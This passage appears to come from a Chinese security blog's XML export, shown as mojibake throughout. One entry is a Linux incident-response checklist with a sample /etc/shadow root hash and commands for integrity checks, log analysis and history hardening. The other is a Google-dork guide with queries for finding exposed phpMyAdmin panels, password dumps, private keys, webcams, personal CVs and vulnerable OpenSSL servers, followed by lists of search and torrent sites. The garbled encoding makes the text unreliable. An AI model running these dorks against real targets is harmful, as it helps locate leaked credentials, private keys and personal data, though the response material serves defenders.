¼å¼1root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸåˆ°çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™ 3ã€‘ç³»ç»Ÿæ–‡ä»¶çš„å®Œæ•´æ€§åˆ†æ1ã€æŸ¥çœ‹é‡è¦å‘½ä»¤çš„MD5å€¼æ˜¯å¦å‘ç”Ÿæ”¹å˜å‚æ•°ï¼šlsã€findã€du ã€psã€top ã€whoã€lastã€chshã€passwdã€catã€ viã€crontabã€netstatç­‰ç­‰1)ã€æ‰¾åˆ°ä¸Šè¿°å‘½ä»¤æ‰€ä½¿ç”¨çš„æ–‡ä»¶ï¼šwhich ls find ps last ç­‰ç­‰2)ã€è®¡ç®—MD5çš„å€¼ï¼šmd5sum /bin/ls /usr/bin/find /usr/bin/ps ç­‰ç­‰3)ã€ä¸ç›¸åŒç‰ˆæœ¬ç³»ç»Ÿæˆ–ä¹‹å‰çš„å¤‡ä»½çš„ç›¸åº”å€¼è¿›è¡Œæ¯”è¾ƒã€‚ 2ã€æ£€æŸ¥åŒ…å®‰è£…åçš„å˜åŒ–ä½¿ç”¨RPMå‘½ä»¤è¿›è¡ŒæŸ¥çœ‹ï¼Œä¸»è¦æŸ¥çœ‹å‘½ä»¤ç”±å“ªä¸€ä¸ªåŒ…å®‰è£…ï¼Œå¹¶æ£€æŸ¥åŒ…è‡ªå®‰è£…åæ–‡ä»¶æ˜¯å¦å‘ç”Ÿè¿‡å˜åŒ–ã€‚ 3ã€æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨ROOTKITä¸€èˆ¬æ£€æµ‹å·¥å…·å¯ä»¥ä½¿ç”¨chkrootkitã€rkhunterç­‰ï¼ˆè¯¦æƒ…è¯·å‚è€ƒhttp://www.evil0x.com/posts/8146.htmlï¼‰å¦å¤–ï¼šæ²³é©¬ webshell æŸ¥æ€ï¼š http://www.shellpub.com æ·±ä¿¡æœ Webshell ç½‘ç«™åé—¨æ£€æµ‹å·¥å…·ï¼š http://edr.sangfor.com.cn/backdoor_detection.html 4ã€‘ç½‘ç»œè¿æ¥1ã€ç«¯å£ï¼šä½¿ç”¨netstatå‘½ä»¤æŸ¥çœ‹å½“å‰å¼€æ”¾çš„ç«¯å£ä¿¡æ¯(netstat -antlp|more)ï¼Œå½“ç„¶å¯çµæ´»é…åˆgrepå‘½ä»¤ï¼Œè·å–éœ€è¦çš„ä¿¡æ¯ã€‚æ›´å¤šnetstatä½¿ç”¨å§¿åŠ¿å¯å‚è€ƒhttp://www.cnblogs.com/ggjucheng/archive/2012/01/08/2316661.htmlã€‚å¯ä»¥ä½¿ç”¨lsof -i :port æ˜¾ç¤ºè¿›ç¨‹å’Œç«¯å£çš„å¯¹åº”å…³ç³» 2ã€å½“å‰ç™»å½•ç”¨æˆ·whoæŸ¥çœ‹å½“å‰ç™»é™†ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç­‰äº† ptsè¿œç¨‹ç™»å½•ï¼‰æ‰§è¡ŒwæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯,å¯çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸ºã€‚uptimeæŸ¥çœ‹ç™»å½•å¤šä¹…ï¼Œå¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½ä¿¡æ¯ 5ã€‘è¿›ç¨‹å’ŒæœåŠ¡1ã€ä½¿ç”¨ps -auxæŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ã€‚æˆ–è€…ä½¿ç”¨ps -ef ï¼ˆps -efå¯¹äºåå¼¹shellï¼Œæ›´ä¾¿äºå‘ç°ï¼‰2ã€ä½¿ç”¨chkconfig -listæŸ¥çœ‹æœåŠ¡å¯åŠ¨ä¿¡æ¯ã€‚ 6ã€‘å…¶ä»–æ–¹é¢ï¼š1ã€å®šä½å«æœ‰Sä½æƒé™çš„æ–‡ä»¶å‘½ä»¤ï¼šfind / -perm -004000 -type f2ã€æ£€æŸ¥æœ€è¿‘ä¸€æ®µæ—¶é—´å†…æ›´æ”¹çš„æ–‡ä»¶find /home/work -type f -mtime T3ã€æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡crontab -lcd /etc/crontablscrontab -råˆ é™¤åé—¨è‡ªå¯è®¡åˆ’ä»»åŠ¡4ã€æŸ¥çœ‹æ‰§è¡Œè¿‡ä»€ä¹ˆå‘½ä»¤history æŸ¥çœ‹rootç”¨æˆ·çš„å†å²å‘½ä»¤cat ~/.bash_historyhistory | grep &#39;2017-2-12&#39; æ ¹æ®æ—¶é—´æŸ¥çœ‹å¹²äº†ä»€ä¹ˆhistory | tail -n 5 æ˜¾ç¤ºæœ€è¿‘5æ¬¡æ‰§è¡Œçš„å‘½ä»¤history -c æ¸…ç©ºhistoryå†å²5ã€æŸ¥çœ‹æœ‰æ²¡æœ‰ææƒç—•è¿¹cat /etc/passwd ææœ‰å¯èƒ½å…¶ä»–ç”¨æˆ·å‡ºç°idï¼Œç»„id 0ã€0çš„æƒ…å†µlsof -g gidå· é€šå¸¸èƒ½æ‰¾åˆ°æ¶æ„æ–‡ä»¶å…³è”çš„libæ–‡ä»¶6ã€æ˜¾ç¤ºæœ€åç™»å½•ç³»ç»Ÿçš„å€’æ•°10æ¡è®°å½•last -107ã€ç¦»çº¿ç³»ç»Ÿæ•°æ®ï¼šå¯¹äºç°åœºæ— æ³•å®šä½çš„ç³»ç»Ÿï¼Œåœ¨å–å¾—æ‰¹å‡†åå¯å°†é—®é¢˜ä¸»æœºçš„æ•°æ®è¿›è¡Œé•œåƒæ‹·è´ï¼Œæ–¹ä¾¿éšåè¿›è¡Œåˆ†æã€‚8ã€ å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥ï¼šå½“æˆ‘ä»¬éœ€è¦å¼€æœºå¯åŠ¨è‡ªå·±çš„è„šæœ¬æ—¶ï¼Œåªéœ€è¦å°†å¯æ‰§è¡Œè„šæœ¬ä¸¢åœ¨ /etc/init.dç›®å½•ä¸‹ï¼Œç„¶ååœ¨ /etc/rc.d/rc*.dä¸­å»ºç«‹è½¯é“¾æ¥å³å¯ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100sshæ­¤å¤„ sshdæ˜¯å…·ä½“æœåŠ¡çš„è„šæœ¬æ–‡ä»¶ï¼ŒS100sshæ˜¯å…¶è½¯é“¾æ¥ï¼ŒS å¼€å¤´ä»£è¡¨åŠ è½½æ—¶è‡ªå¯åŠ¨ï¼›å¦‚æœæ˜¯ K å¼€å¤´çš„è„šæœ¬æ–‡ä»¶ï¼Œä»£è¡¨è¿è¡Œçº§åˆ«åŠ è½½æ—¶éœ€è¦å…³é—­çš„å› æ­¤éœ€è¦å¯¹å¯åŠ¨é¡¹æ–‡ä»¶è¿›è¡Œæ’æŸ¥ï¼š 12345more /etc/rc.local/etc/rc.d/rc[0~6].dls -l /etc/rc.d/rc3.d/ 9ã€è¡¥å……ä¸€ç‚¹åŠ å›ºhistoryä¿¡æ¯çš„çŸ¥è¯†ï¼š1ï¼‰ä¿å­˜ 1 ä¸‡æ¡å‘½ä»¤ sed -i â€˜s/^HISTSIZE=1000/HISTSIZE=10000/gâ€™ /etc/profile 2ï¼‰ä¸ºå†å²çš„å‘½ä»¤å¢åŠ ç™»å½•çš„IPåœ°å€ã€æ‰§è¡Œå‘½ä»¤æ—¶é—´ç­‰ä¿¡æ¯ï¼šåœ¨ /etc/profileçš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ï¼š 12345678910111213141516171819######jiagu history xianshi#########USER_IP=who-uam i 2&gt;/dev/null | awk&apos;&#123;print $NF&#125;&apos;| sed-e&apos;s/[()]//g&apos;if[ &quot;$USER_IP&quot;=&quot;&quot;]thenUSER_IP=hostnamefiexportHISTTIMEFORMAT=&quot;%F %T $USER_IPwhoami &quot;shopt-shistappendexportPROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ########## 3ï¼‰source /etc/profileè®©é…ç½®ç”Ÿæ•ˆç”Ÿæˆæ•ˆæœï¼š 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile æ€»ç»“ä»¥ä¸Šæ˜¯åº”æ€¥å“åº”çš„ä¸€äº›ä¸»è¦çš„æ­¥éª¤å’Œæµç¨‹ï¼Œå¸Œæœ›é€šè¿‡è¿™äº›æ€»ç»“ï¼Œç»™å¤§å®¶å¸¦æ¥å¸®åŠ©ã€‚å¦‚æœ‰é—®é¢˜ï¼Œæ¬¢è¿ç•™è¨€äº¤æµ~~ Tips:1ã€åœ¨åº”æ€¥å“åº”ä¸­ï¼Œé‡è¦æ•°æ®çš„åˆ†æå·¥ä½œæœ€å¥½æ‹·è´è‡³å·¥ä½œæœºå™¨ä¸­æ–°å»ºçš„è™šæ‹Ÿæœºä¸­è¿›è¡Œã€‚2ã€æ—¥å¿—ä¿¡æ¯å¯ä»¥é€šè¿‡é‡å®šå‘æ¥è®°å½•ç»“æœï¼›åœ¨æ”¶é›†å‰ä½¿ç”¨du -sh /æ—¥å¿—è·¯å¾„ å‘½ä»¤åˆ¤æ–­æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œè¿‡å¤§åˆ™æ ¹æ®æƒ…å†µæå–ç‰¹å®šæ—¶é—´æ®µçš„æ—¥å¿—ä¿¡æ¯ã€‚3ã€æ ¹æ®æƒ…å†µè¿˜å¯ä»¥å¯¹æµé‡ã€æ•°æ®åº“ã€åŸºç¡€ç½‘ç»œç­‰æ–¹é¢è¿›è¡Œæ£€æµ‹æ’æŸ¥ã€‚ è¡¥å……ä¸€ï¼šlastloglastlogæ–‡ä»¶åœ¨æ¯æ¬¡æœ‰ç”¨æˆ·ç™»å½•æ—¶è¢«æŸ¥è¯¢ã€‚å¯ä»¥ä»¥rootèº«ä»½è¿è¡Œlastlogå‘½ä»¤æ£€æŸ¥æŸç‰¹å®šç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„æ—¶é—´ï¼Œå¹¶æ ¼å¼åŒ–è¾“å‡ºä¸Šæ¬¡ç™»å½•æ—¥å¿—/var/log/lastlogçš„å†…å®¹ã€‚å®ƒæ ¹æ®UIDæ’åºæ˜¾ç¤ºç™»å½•åã€ç«¯å£å·ï¼ˆttyï¼‰å’Œä¸Šæ¬¡ç™»å½•æ—¶é—´ã€‚å¦‚æœä¸€ä¸ªç”¨æˆ·ä»æœªç™»å½•è¿‡ï¼Œlastlogæ˜¾ç¤ºNever loggedã€‚*è¯­æ³•lastlog(é€‰é¡¹) *é€‰é¡¹-b&lt;å¤©æ•°&gt;ï¼šæ˜¾ç¤ºæŒ‡å®šå¤©æ•°å‰çš„ç™»å½•ä¿¡æ¯&#39;-hï¼šæ˜¾ç¤ºå¬é›†ä»¤çš„å¸®åŠ©ä¿¡æ¯;-t&lt;å¤©æ•°&gt;ï¼šæ˜¾ç¤ºæŒ‡å®šå¤©æ•°ä»¥æ¥çš„ç™»å½•ä¿¡æ¯;-u&lt;ç”¨æˆ·å&gt;ï¼šæ˜¾ç¤ºæŒ‡å®šç”¨æˆ·çš„æœ€è¿‘ç™»å½•ä¿¡æ¯ã€‚ äºŒï¼šå®šæ—¶ä»»åŠ¡å¼‚å¸¸æ’æŸ¥ï¼šmore /etc/cron.daily/* æŸ¥çœ‹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åŸç†ï¼š1ã€crontabåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼šcrontab -låˆ—å‡ºæŸä¸ªç”¨æˆ· cron æœåŠ¡çš„è¯¦ç»†å†…å®¹Tipsï¼šé»˜è®¤ç¼–å†™çš„ crontab æ–‡ä»¶ä¼šä¿å­˜åœ¨ ( /var/spool/cron/ç”¨æˆ·åä¾‹å¦‚: /var/spool/cron/rootï¼‰crontab -råˆ é™¤æ¯ä¸ªç”¨æˆ· cront ä»»åŠ¡(è°¨æ…ï¼šåˆ é™¤æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡)crontab -eä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰çš„ crontab æ–‡ä»¶å¦‚:*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txtæ¯åˆ†é’Ÿå†™å…¥æ–‡ä»¶2ã€åˆ©ç”¨ anacron å®ç°å¼‚æ­¥å®šæ—¶ä»»åŠ¡è°ƒåº¦ ä¸‰ï¼šæœåŠ¡ æœåŠ¡è‡ªå¯åŠ¨ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š123chkconfig [--level è¿è¡Œçº§åˆ«][ç‹¬ç«‹æœåŠ¡å][on|off]chkconfig â€“level 2345 httpd on å¼€å¯è‡ªå¯åŠ¨chkconfig httpd on ï¼ˆé»˜è®¤ level æ˜¯ 2345ï¼‰ ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š ä¿®æ”¹ /etc/re.d/rc.local æ–‡ä»¶ åŠ å…¥ /etc/init.d/httpd start ç¬¬ä¸‰ç§ä¿®æ”¹æ–¹æ³•ï¼š ä½¿ç”¨ ntsysv å‘½ä»¤ç®¡ç†è‡ªå¯åŠ¨ï¼Œå¯ä»¥ç®¡ç†ç‹¬ç«‹æœåŠ¡å’Œ xinetd æœåŠ¡ã€‚ å…¥ä¾µæ’æŸ¥ 1ã€æŸ¥è¯¢å·²å®‰è£…çš„æœåŠ¡ï¼š RPM åŒ…å®‰è£…çš„æœåŠ¡: chkconfig --listæŸ¥çœ‹æœåŠ¡è‡ªå¯åŠ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„RPMåŒ…å®‰è£…çš„æœåŠ¡ ps aux | grep crondæŸ¥çœ‹å½“å‰æœåŠ¡ ç³»ç»Ÿåœ¨ 3 ä¸ 5 çº§åˆ«ä¸‹çš„å¯åŠ¨é¡¹ ä¸­æ–‡ç¯å¢ƒ chkconfig â€“list | grep â€œ3:å¯ç”¨|5:å¯ç”¨â€ è‹±æ–‡ç¯å¢ƒ chkconfig â€“list | grep â€œ3:on|5:onâ€ æºç åŒ…å®‰è£…çš„æœåŠ¡ æŸ¥çœ‹æœåŠ¡å®‰è£…ä½ç½® ï¼Œä¸€èˆ¬æ˜¯åœ¨ /user/local/ service httpd start æœç´¢ /etc/rc.d/init.d/æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ å››ï¼šä¸€äº›æ—¥å¿—åˆ†ææŠ€å·§ï¼š1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„ root å¸å·ï¼š grep â€œFailed password for rootâ€ /var/log/secure | awk â€˜{print $11}â€™ | sort | uniq -c | sort -nr | moreå®šä½æœ‰å“ªäº› IP åœ¨çˆ†ç ´ï¼šgrep â€œFailed passwordâ€ /var/log/secure|grep -E -o â€œ(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)â€|uniq -cçˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿgrep â€œFailed passwordâ€ /var/log/secure|perl -e â€˜while($_=&lt;&gt;){ /for(.*?) from/; print â€œ$1nâ€;}â€™|uniq -c|sort -nr 2ã€ç™»å½•æˆåŠŸçš„ IP æœ‰å“ªäº›ï¼š grep â€œAccepted â€œ /var/log/secure | awk â€˜{print $11}â€™ | sort | uniq -c | sort -nr | more ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š grep â€œAccepted â€œ /var/log/secure | awk â€˜{print $1,$2,$3,$9,$11}â€™ 3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ· kali æ—¥å¿—ï¼š12345Jul1000:12:15localhostuseradd[2382]: newgroup: name=kali, GID=1001Jul1000:12:15localhostuseradd[2382]: newuser: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul1000:12:58localhostpasswd: pam_unix(passwd:chauthtok): passwordchangedforkali#grep&quot;useradd&quot;/var/log/secure 4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼š1234567Jul1000:14:17localhostuserdel[2393]: deleteuser&apos;kali&apos;Jul1000:14:17localhostuserdel[2393]: removedgroup&apos;kali&apos; ownedby&apos;kali&apos;Jul1000:14:17localhostuserdel[2393]: removedshadowgroup&apos;kali&apos; ownedby&apos;kali&apos;#grep&quot;userdel&quot;/var/log/secure 5ã€su åˆ‡æ¢ç”¨æˆ·ï¼š1Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo æˆæƒæ‰§è¡Œ:1sudo -lJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now å‚è€ƒé“¾æ¥ï¼šhttp://www.sohu.com/a/259254300_649850æ„Ÿè°¢ä¿¡å®‰ä¹‹è·¯ã€ŠLinux åº”æ€¥å“åº”æµç¨‹åŠå®æˆ˜æ¼”ç»ƒã€‹æ–‡ç« ä½œè€…ç­‰ï¼Œè¯¥æ–‡ä¸­ä¹Ÿæœ‰å‡ å¤„åº”æ€¥æ¡ˆä¾‹å¯ä¾›å‚è€ƒã€‚]]></content>
      <categories>
        <category>å®‰å…¨æœåŠ¡</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æµè§ˆå™¨æœç´¢æŠ€å·§æ€»ç»“]]></title>
    <url>%2F2017%2F02%2F22%2F6%2F</url>
    <content type="text"><![CDATA[ä»‹ç»è®°å¾—ä»¥å‰å½¢å®¹äººçš„èƒ½åŠ›ä¸€èˆ¬æ˜¯ç”¨æ™ºå•†ã€æƒ…å•†æ¥å½¢å®¹ï¼Œä½†æ˜¯åˆ°äº†ç°åœ¨è¿™ä¸ªä¿¡æ¯æ¾æ¹ƒçš„æ—¶ä»£ï¼Œæœå•†ä¹Ÿæ„ˆæ¥æ„ˆå‘é‡è¦ï¼Œåœ¨æ¸—é€æµ‹è¯•æˆ–è€…å…¶ä»–æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼ŒæŒæ¡å¥½æœç´¢æŠ€å·§ç»å¸¸èƒ½äº‹åŠåŠŸå€ã€‚ä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹æœ¬äººæ‰€ç†Ÿæ‚‰çš„æœç´¢è¯­æ³•ï¼š åŸºç¡€intext: åªæœç´¢ç½‘é¡µéƒ¨åˆ†ä¸­åŒ…å«çš„æ–‡å­—(ä¹Ÿå°±æ˜¯å¿½ç•¥äº†æ ‡é¢˜,URL ç­‰çš„æ–‡å­—).(ç®¡ç†ï¼Œ)site: å¯ä»¥é™åˆ¶ä½ æœç´¢èŒƒå›´çš„åŸŸå. ex:site: baidu.com filetype:txt æŸ¥æ‰¾ TXT æ–‡ä»¶filetype: æœç´¢æ–‡ä»¶çš„åç¼€æˆ–è€…æ‰©å±•å ï¼ˆdoc.mdb.ppt.swf.sqlâ€¦ï¼‰allintitle: æœç´¢æ‰€æœ‰å…³é”®å­—æ„æˆæ ‡é¢˜çš„ç½‘é¡µ. ä½†æ˜¯æ¨èä¸è¦ä½¿ç”¨link: å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ‰€æœ‰åŒ…å«äº†æŸä¸ªæŒ‡å®š URL çš„é¡µé¢åˆ—è¡¨. ä¾‹å¦‚:link:www.google.com å°±å¯ä»¥å¾—åˆ°æ‰€æœ‰è¿æ¥åˆ° Google çš„é¡µé¢Intitle or Allintitle: åœ¨é¡µé¢æ ‡é¢˜ä¸­æœç´¢Related: æ˜¾ç¤ºç›¸å…³ç«™ç‚¹inanchor or allinanchor: æœç´¢èŒƒå›´é™åˆ¶åœ¨é¡µé¢çš„é“¾æ¥é”šç‚¹æè¿°æ–‡æœ¬è¿›è¡Œæœç´¢Inurl or Allinurl: åœ¨URLä¸­æŸ¥æ‰¾æ–‡æœ¬ï¼ˆåŒ…å«å¤§é‡ç‰¹æ®Šå­—ç¬¦ï¼Œæœ€ä¸ºå¹¿æ³›ä½¿ç”¨ï¼‰ç”¨äºæœç´¢ç½‘é¡µä¸ŠåŒ…å«çš„ URL. (file,)Phonebook: æœç´¢ç”µè¯åˆ—è¡¨Rphonebook: æœç´¢ä½å®…ç”µè¯åˆ—è¡¨Bphonebook: å•†ä¸šç”µè¯åˆ—è¡¨Author: æœç´¢Googleä¸­æ–°é—»ç»„å¸–å­çš„ä½œè€…Group: æœç´¢Googleæ ‡é¢˜Inanchor: åœ¨é“¾æ¥æ–‡æœ¬ä¸­æŸ¥æ‰¾æ–‡æœ¬Masgid: é€šè¿‡æ¶ˆæ¯idæ¥æŸ¥æ‰¾è°·æ­Œçš„å¸–å­Daterange: æŸ¥æ‰¾æŸä¸ªç‰¹å®šæ—¥æœŸèŒƒå›´å†…å‘å¸ƒçš„ç½‘é¡µInsubject: æœç´¢Googlegroupçš„ä¸»é¢˜è¡ŒCache: æ˜¾ç¤ºç½‘é¡µçš„ç¼“å­˜ç‰ˆæœ¬Stocks: æœç´¢è‚¡ç¥¨ä¿¡æ¯Info: æ˜¾ç¤ºGoogleçš„æ‘˜è¦ä¿¡æ¯Define: æ˜¾ç¤ºæŸæœ¯è¯­çš„å®šä¹‰Numrang: æœç´¢æ•°å­—éœ€è¦ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªæœ€å°æ•°ï¼Œä¸€ä¸ªæœ€å¤§æ•°ï¼Œç”¨ç ´æŠ˜å·éš”å¼€+ åŠ å…¥è¢«å¿½ç•¥çš„è¯- å¿½ç•¥æ’é™¤æŸä¸ªè¯~ åŒæ„è¯å³ç±»ä¼¼çš„è¯. å•ä¸€çš„é€šé…ç¬¦* é€šé…ç¬¦ï¼Œå¯ä»£è¡¨å¤šä¸ªå­—æ¯â€œ â€ ç²¾ç¡®æŸ¥è¯¢åŒ¹é…å¸ƒå°”æ“ä½œ:and ä¸or æˆ–not ä¸ åˆ©ç”¨12&quot;Welcome to phpmyadmin ***&quot; &quot;running on * as root@*&quot; intitle:phpmyadmin&quot;mysql error with query&quot; æ•°æ®åº“ç¨‹åºå’Œé”™è¯¯æ–‡ä»¶ â€œAssessment reportâ€ â€œnessusâ€ filetype:pdf å®‰å…¨æ‰«ææŠ¥å‘Š â€œadvanced guestbook * poweredâ€ inurl:addentry.phpintitle:â€View imgâ€ inurl:viewimg.php ç¨‹åºä¸­å«æœ‰SQLæ³¨å…¥æ¼æ´å¹¶ä¸”è·¯å¾„å¯ä»¥ä¿®æ”¹å¼±å£ â€œphp versionâ€ intitle:phpinfo inurl:info.php æ•æ„Ÿä¿¡æ¯ intitle:â€usage Statistics(ç»Ÿè®¡è¡¨) forâ€ intext:â€Total Unique Usernamesâ€ ç”¨æˆ·å§“å intitle:CV OR intitle:Lebenslauf â€œthomas fischerâ€intitle:CV OR intitle:Lebenslauf ext:pdf OR ext:doc ä¸ªäººç®€å† allintext: name email phone address intext:â€thomas fischer(äººç‰©)â€ ext:pdfTwiki inurl:â€View/Mainâ€ â€œthomas fischerâ€ æè¿°æ ‡è¯†ç§äººçš„ä¿¡æ¯(å§“åï¼Œåœ°å€ï¼Œç”µè¯ï¼Œç”µè¯åˆ†æœº) intitle:â€live View/ -AXISâ€ | inurl:view/view.shtmlinurl:â€ViewFrame?Mode=â€inurl:â€MultiCameraFrame?Mode=â€inturl:â€axis-cgi/mjpgâ€intext:â€MOBOTIX M1â€³intext:â€Open Menuâ€inurl:â€view/index.shtmlâ€ åœ¨çº¿ç½‘ç»œæ‘„åƒå¤´ â€œindex ofâ€ (private | secure | geheim | gizli)â€œrobots.txtâ€ â€œUser-agentâ€ ext:txtâ€œthis document is private | confidential| secretâ€ ext:doc | ext:pdf | ext:xlsintitle:â€index ofâ€ â€œjpg | png | bmpâ€ inurlâ€personal | inurl:private æœºå¯†çš„ç›®å½•å’Œæ–‡ä»¶ â€œindex ofâ€ inbox.dbxâ€œTo parent directoryâ€ inurl:â€Identitiesâ€ ç§äººä¿¡ä»¶/é‚®ä»¶ â€œsession startâ€ â€œsession identâ€ thomas ext:txt èŠå¤©æ—¥å¿— -â€œpublic | pubring | pubkeysignature | pgp | and | or |releaseâ€ ext:gpg-intext:â€andâ€ (ext:enc | ext:axx)â€œciphervalueâ€ ext:xml ç»è¿‡åŠ å¯†çš„æ¶ˆæ¯ â€œBegin (DSA | RSA)â€ ext:keyã€â€œindex ofâ€ â€œsecring.gpgâ€ æœç´¢éšç§çš„å¯†ç  â€œindex ofâ€ slave_datatrans OR from_master æœç´¢å¯†é’¥ â€œcreate tableâ€ insert intoâ€ â€œpass|passwd|passwordâ€ (ext:sql | ext:dump | ext:txt)ã€â€œyour password * isâ€ (ext:csv | ext.doc | ext:txt) æœç´¢ç”¨æˆ·åå’Œå¯†ç  inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin æŸ¥æ‰¾å¯ä»¥æœªç»æˆæƒå°±å¯ä»¥è®¿é—®çš„phpMyAdminçš„åå°é¡µé¢ â€œOpenSSLâ€ AND â€œ1.0.1 Server atâ€ OR â€œ1.0.1a Server atâ€ OR â€œ1.0.1b Server atâ€ OR â€œ1.0.1c Server atâ€ OR â€œ1.0.1d Server atâ€ OR â€œ1.0.1e Server atâ€ OR â€œ1.0.1f Server atâ€ å…¶ä»–æ‰©å±•åœ¨ä½¿ç”¨æœç´¢è¯­æ³•çš„åŒæ—¶ä¹Ÿå¯ä»¥æ”¶é›†ä¸€äº›æ­¤ç±»ç½‘å€ï¼Œå¯¹äºæ‰¾ä¸œè¥¿çš„å¸®åŠ©å¯æ˜¯å¾ˆå¤§çš„å‘¢ æœç´¢ç™¾åº¦ç›˜:å¤©å¤©äº‘æœ: http://so.ygyhg.comå‘†æœ¨ç“œ: http://md5.daimugua.comé’Ÿé¦—ä¹‹çœ¼: https://www.zoomeye.orgshoudan: https://www.shodan.ioSeeBug: https://www.seebug.orgé›…è™: https://sg.search.yahoo.comå¿…åº”å›½é™…ç‰ˆhttps://www.bing.comMAEZWhttps://so.mezw.com å…¶ä»–å°ä¼—æœç´¢å¼•æ“:https://bird.so/https://search.avira.com/#/https://suche.gmx.net/webhttps://r0.ru/https://www.yandex.com/https://search.avira.com/https://www.qwant.comhttps://www.ecosia.org/ ç½‘ç›˜æœç´¢å»è½¬ç›˜http://www.quzhuanpan.com/èƒ–æ¬¡æœç´¢http://www.panc.ccé¸µé¸Ÿhttp://www.tuoniao.me/ç›˜æœhttp://www.pansou.com007http://wangpan007.comç™¾åº¦ç›˜http://sobaidupan.comç›˜å¤šå¤šhttp://www.panduoduo.net/è¥¿æ—è¡—http://www.xilinjie.com/å°ä¸ç‚¹https://www.xiaoso.net ç£åŠ›èµ„æº^.^https://btso.pw/search/https://a8bt.cc/http://www.btcherry.info/https://rarbg.is/torrents.phphttp://storebt.cc/https://idope.se/https://www.69mag.xyz/ åŠ¨æ¼«èµ„æºåŠ¨æ¼«èŠ±å›­http://share.dmhy.org/å–µæœhttps://nyaso.com/å¤–å›½ä½¬çš„https://gelbooru.com/Dç«™http://www.dilidili.com/èœœæŸ‘è®¡åˆ’http://mikanani.me/ç®€å•åŠ¨æ¼«http://www.36dm.com/æ±ç©ºåŠ¨æ¼«http://www.xkdmbt.com/æ¼«çŒ«åŠ¨æ¼«http://www.comicat.org/èŒç•ªç»„https://bangumi.moe/ ç”µå­ä¹¦æœç´¢å¼•æ“forfrigghttp://forfrigg.com/é¸ æ‘©æœç´¢https://www.jiumodiary.com/kindlesharehttps://sk.kindleshare.cnhttps://www.owllook.net/ ç«™ç‚¹å¯¼èˆªè™«éƒ¨è½æœç´¢http://search.chongbuluo.com/è™«éƒ¨è½èµ„æºæœç´¢http://magnet.chongbuluo.com/æ¸—é€å¸ˆhttp://shentoushi.top/ç­‰ç­‰,,,,,, ç•™æ„(1) æ“ä½œç¬¦ã€å†’å·ã€å…³é”®å­—ä¹‹é—´æ˜¯æ²¡æœ‰ç©ºæ ¼çš„ã€‚(2) å¸ƒå°”æ“ä½œç¬¦ï¼ˆANDã€ORã€NOTï¼‰å’Œç‰¹æ®Šå­—ç¬¦ï¼ˆ-ã€+ï¼‰ä»å¯ç”¨ä½œé«˜çº§æ“ä½œç¬¦æŸ¥è¯¢ï¼Œä½†æ˜¯ä¸èƒ½æŠŠä»–ä»¬æ”¾åœ¨å†’å·ä¹‹å‰è€ŒæŠŠå†’å·å’Œæ“ä½œç¬¦åˆ†å¼€ã€‚(3) é«˜çº§æ“ä½œç¬¦èƒ½å¤Ÿå’Œå•ç‹¬çš„æŸ¥è¯¢æ··åˆä½¿ç”¨(4) 